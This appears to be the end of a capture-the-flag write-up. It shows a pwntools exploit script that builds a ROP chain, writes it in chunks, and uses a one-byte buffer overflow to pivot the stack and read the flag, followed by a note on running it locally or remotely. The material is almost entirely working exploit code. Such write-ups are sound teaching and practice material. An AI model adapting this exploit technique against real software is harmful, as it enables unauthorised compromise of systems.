# third stage puts(BUFFER)
payload += flat(
  cto('acba'),
  PAYLOAD_START+len(payload)+0x100, # r31
  cyc(cfd('acha')-(cfd('acba')+8)),
  0x10022170, # set r3 r4 again
  cto('caaa'),
  PAYLOAD_START+0xf400, #r3
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0x6fe1be2, #r4
  cto('caaa'),
  exe.sym.puts
)

rop_size = (len(payload)//0x100) + 1

payload = payload + cyclic((0x100*rop_size)-len(payload))

assert len(payload) <= 0x1e00, 'payload to long'

lhex(rop_size, 'rop_size: ')

p = lprog('prepare payload')
for i in range(0, rop_size):
  p.status(f'{i}/{rop_size}')
  if i & 1 == 0:
    choose(i//2)
    set_planet(payload[i*0x100:(i + 1)*0x100])
  else:
    set_name(payload[i*0x100:(i + 1)*0x100])

p.success('start payload')

linfo('one byte BOF')
bof = flat(
  cyclic(0x100),
  p8(0x64)   
)

set_name(bof, oob=True)

linfo('pivot stack to payload')
exc()

rl()
linfo('flag: '+ rl().decode())

if args.GDB:
  it()
```

> Note: If you don't want to install vagd you can run the exploit locally (inside the vm) using the arguments `LOCAL` or only on the remote using `REMOTE`

</details>